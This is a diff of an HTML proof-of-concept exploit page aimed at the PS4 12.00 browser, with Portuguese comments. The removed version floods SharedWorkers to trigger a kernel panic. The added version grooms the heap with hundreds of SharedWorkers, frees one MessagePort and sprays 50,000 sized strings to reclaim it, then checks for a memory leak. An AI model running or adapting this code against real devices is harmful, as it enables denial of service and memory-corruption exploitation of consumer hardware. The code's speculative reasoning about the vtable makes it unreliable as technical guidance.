@@ -1,81 +1,130 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Kernel Resource Exhaustion PoC</title>
+    <title>PS4 12.00 - C0 VALIDATION</title>
+    
 </head>
 <body>
 
-    <h1>SharedWorker Kernel Panic PoC</h1>
+    <h1>VALIDAÇÃO DE TAMANHO: 0xC0 (192 bytes)</h1>
+    <h3>Método: String Spray de Precisão</h3>
     
-    <p>Target limit > 400 Safe.</p>
-    <p>Target limit > 401-405 triggers Freeze.</p>
-    <p>Target limit > 405+ Starts Kernel Panic.</p>
-
-    <label>
-        Workers Target: <input type="number" id="count" value="600">
-    </label>
-    <button onclick="run()">TRIGGER PANIC</button>
-
-    <div id="log">Ready.<br></div>
+    <button onclick="start_validation()">INICIAR VALIDAÇÃO</button>
+    <div id="log">Sistema pronto.</div>
 
     <script>
-        // Array to keep workers alive (prevent GC and force Kernel allocation)
-        let keeps = [];
-
-        function log(msg) {
-            const el = document.getElementById('log');
-            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
+        function log(msg, type="") {
+            var d = document.getElementById("log");
+            var color = type === "success" ? "#0f0" : "#ccc";
+            if (type === "fail") color = "#f00";
+            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.scrollTop = d.scrollHeight;
         }
 
-        function run() {
-            const limit = parseInt(document.getElementById('count').value);
-            log(`Allocating ${limit} SharedWorkers...`);
-            log("System instability expected around 400.");
-            log("Kernel Panic expected above 405.");
+        // =================================================================
+        // 1. PAYLOAD: STRING CALIBRADA (0xC0)
+        // =================================================================
+        // Objetivo: Criar uma string que ocupe exatos 192 bytes na memória.
+        // Header String (64-bit): ~32 bytes (dependendo da engine, pode ser 24)
+        // Espaço para dados: 192 - 32 = 160 bytes.
+        // Caracteres UTF-16 (2 bytes): 160 / 2 = 80 caracteres.
+        // Vamos testar 80 chars.
+        
+        function build_string_payload() {
+            var len = 80; 
+            var str = "";
+            // Padrão "A" (0x0041)
+            for(var i=0; i<len; i++) {
+                str += "A";
+            }
+            return str;
+        }
 
-            if (!window.SharedWorker) return log("SharedWorker API not supported.");
+        // =================================================================
+        // 2. EXECUÇÃO
+        // =================================================================
+        var workers = [];
+        var strings = [];
 
-            let created = 0;
+        async function start_validation() {
+            if(!window.SharedWorker) return log("Erro: Navegador.", "fail");
             
-            // Fast interval to flood the kernel allocator
-            const interval = setInterval(() => {
-                // Batch creation to speed up the process
-                for (let i = 0; i < 5; i++) {
-                    try {
-                        // Using a unique name (timestamp + counter) forces the Kernel 
-                        // to create a new IPC handle/process structure for each worker.
-                        const id = "kpanic_" + Date.now() + "_" + created;
-                        
-                        // Create and hold reference
-                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
-                        sw.port.start(); // Ensure port is active and handle is allocated
-                        keeps.push(sw);
-                        
-                        created++;
+            var payload = build_string_payload();
+            log(`String construída (${payload.length} chars). Iniciando...`);
 
-                        if (created >= limit) {
-                            clearInterval(interval);
-                            log(`Limit reached (${limit}). Waiting for system crash...`);
-                            return;
-                        }
+            // GROOMING (380)
+            for(let i=0; i<380; i++) {
+                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+            }
 
-                    } catch (e) {
-                        // If the browser catches the error, log it.
-                        // However, the Kernel usually panics before this catch block triggers.
-                        clearInterval(interval);
-                        log(`Alloc Error at ${created}: ${e.message}`);
-                        return;
+            // TRIGGER (403)
+            var p_count = 0;
+            var limit = 403 - 380;
+
+            var it = setInterval(() => {
+                if (p_count >= limit) {
+                    clearInterval(it);
+                    
+                    // VÍTIMA (Worker 403)
+                    var v = workers.pop();
+                    var p = v.port;
+                    
+                    // FREE
+                    v.port.close();
+                    v = null;
+                    
+                    // SPRAY (Strings)
+                    // Alocamos muitas strings rapidamente. Elas são alocadas no Heap Geral.
+                    // Se o Worker estiver lá, uma string vai cair no lugar dele.
+                    log("Injetando Strings...");
+                    for(var k=0; k<50000; k++) {
+                        // Adiciona um índice para garantir alocação única, mas mantém tamanho
+                        // (Substitui o final da string)
+                        var s = payload.substring(0, payload.length - 6) + k.toString().padStart(6, "0");
+                        strings.push(s);
                     }
+
+                    // CHECK
+                    setTimeout(() => {
+                        try {
+                            // Se o objeto foi substituído, ele agora é uma String de "AAAA..."
+                            // O método .toString() vai tentar ler a VTable (que agora é 0x00410041...)
+                            // Isso deve gerar um erro de acesso ou retornar lixo.
+                            
+                            var s = p.toString();
+                            
+                            if (s.indexOf("MessagePort") === -1) {
+                                log("!!! SUCESSO !!!", "success");
+                                log("O objeto mudou! Leak confirmado.", "success");
+                                alert("LEAK 0xC0 CONFIRMADO!");
+                            } else {
+                                log("Falha: Objeto ainda é MessagePort.");
+                                // Tenta forçar erro
+                                try { let temp = p.onmessage; } catch(e) {
+                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO: " + e);
+                                }
+                            }
+                        } catch(e) {
+                            log("ERRO CAPTURADO (BOM): " + e, "success");
+                            // Se der erro de acesso, é porque o ponteiro é inválido -> Sucesso no Spray
+                        }
+                        
+                        // Limpa para não travar o PS4
+                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
+                        strings = [];
+                    }, 500);
+                    return;
                 }
                 
-                // Update log every 50 creations to avoid UI lag interfering with the test
-                if (created % 50 === 0) log(`Active: ${created}...`);
-
-            }, 5);
+                try {
+                    let w = new SharedWorker("data:text,1", "v"+p_count);
+                    w.port.start();
+                    workers.push(w);
+                } catch(e){}
+                p_count++;
+            }, 50);
         }
     </script>
 </body>
 </html>
-
-
